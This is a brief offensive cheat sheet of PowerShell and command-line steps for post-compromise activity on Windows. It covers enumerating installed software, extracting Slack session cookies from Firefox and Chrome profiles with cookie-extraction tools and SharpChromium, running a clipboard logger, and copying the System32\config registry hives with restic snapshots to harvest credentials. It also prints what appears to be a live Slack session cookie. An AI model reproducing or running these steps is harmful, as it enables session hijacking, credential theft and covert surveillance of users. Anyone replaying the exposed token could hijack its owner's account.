# Installed Applications
```powershell
$INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |  Select-Object DisplayName, DisplayVersion, InstallLocation
$INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation
$INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize
```

# Firefox Cookie Extraction
```powershell
Firefox: C:\Users\<Sizin_İstifadəçi_Adınız>\AppData\Roaming\Mozilla\Firefox\Profiles\<təsadüfi_simvollar>.default-release\cookies.sqlite
python3 cookieextractor.py --dbpath "/home/plaintext/cookies.sqlite" --host slack --cookie d

Cookie: (201, '', 'd', 'xoxd-CJRafjAvR3UcF%2FXpCDOu6xEUVa3romzdAPiVoaqDHZW5A9oOpiHF0G749yFOSCedRQHi%2FldpLjiPQoz0OXAwS0%2FyqK5S8bw2Hz%2FlW1AbZQ%2Fz1zCBro6JA1sCdyBv7I3GSe1q5lZvDLBuUHb86C%2Bg067lGIW3e1XEm6J5Z23wmRjSmW9VERfce5KyGw%3D%3D', '.slack.com', '/', 1974391707, 1659379143849000, 1658439420528000, 1, 1, 0, 1, 1, 2)

Cookie Editor
```

# Chrome Cookie Extraction
```powershell
https://github.com/djhohnstein/SharpChromium/blob/master/ChromiumCredentialManager.cs#L47

copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies"
Invoke-SharpChromium -Command "cookies slack.com"
```

# Monitor Clipboard
```powershell
https://github.com/inguardians/Invoke-Clipboard/blob/master/Invoke-Clipboard.ps1

Invoke-ClipboardLogger
```

# Initialize Backup Directory
```powershell
mkdir E:\restic2; restic.exe -r E:\restic2 init
$env:RESTIC_PASSWORD = 'Password'
restic.exe -r E:\restic2\ backup C:\SampleFolder

restic.exe -r E:\restic2\ backup C:\Windows\System32\config --use-fs-snapshot

restic.exe -r E:\restic2\ snapshots
restic.exe -r E:\restic2\ restore 9971e881 --target C:\Restore
```
